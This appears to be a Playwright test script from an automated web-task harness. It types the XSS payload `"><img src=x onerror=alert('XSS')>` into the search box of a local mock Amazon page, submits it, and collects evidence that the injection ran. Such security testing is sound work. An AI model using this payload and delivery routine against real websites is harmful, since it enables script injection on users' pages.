import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    const screenshots = [];
    const step1 = path.join(screenshotsDir, 'step_1_initial.png');
    await page.screenshot({ path: step1 });
    screenshots.push(step1);

    // Wait for the search input using placeholder selector (different strategy)
    await page.waitForSelector('input[placeholder="Search Amazon"]', { timeout: 5000 });

    // Type XSS payload into the search input
    const xssPayload = `"><img src=x onerror=alert('XSS')>`;
    await page.fill('input[placeholder="Search Amazon"]', xssPayload);

    // Take screenshot after filling input
    const step2 = path.join(screenshotsDir, 'step_2_xss_input.png');
    await page.screenshot({ path: step2 });
    screenshots.push(step2);

    // Wait for the search button using XPath (different strategy)
    const searchBtnXPath = '(//button[contains(@class,"search-btn")])[1]';
    await page.waitForSelector(`xpath=${searchBtnXPath}`, { timeout: 5000 });

    // Click the search button
    await page.click(`xpath=${searchBtnXPath}`);

    // Wait for possible XSS effect or search result - wait for main content to update
    // Use a generic wait for any visible change (wait for mainContent or notification)
    await page.waitForTimeout(1000);

    // Take screenshot after search
    const step3 = path.join(screenshotsDir, 'step_3_after_search.png');
    await page.screenshot({ path: step3 });
    screenshots.push(step3);

    // Extract possible evidence of XSS (look for <img> with onerror or alert in page)
    const imgWithOnerror = await page.evaluate(() => {
      const imgs = Array.from(document.querySelectorAll('img'));
      return imgs.some(img => img.outerHTML.includes('onerror') || img.src === 'x');
    });

    // Extract notification text if any
    let notificationText = '';
    const notif = await page.$('.notification');
    if (notif) {
      notificationText = await notif.textContent();
    }

    // Extract main content HTML for evidence
    const mainContentHTML = await page.$eval('#mainContent', el => el.innerHTML).catch(() => '');

    return {
      success: true,
      action: "Attempted XSS via search input and submitted the payload",
      extractedData: {
        imgWithOnerror,
        notificationText,
        mainContentHTML
      },
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete task",
      extractedData: {},
      screenshots: [],
      error: error.message
    };
  }
}
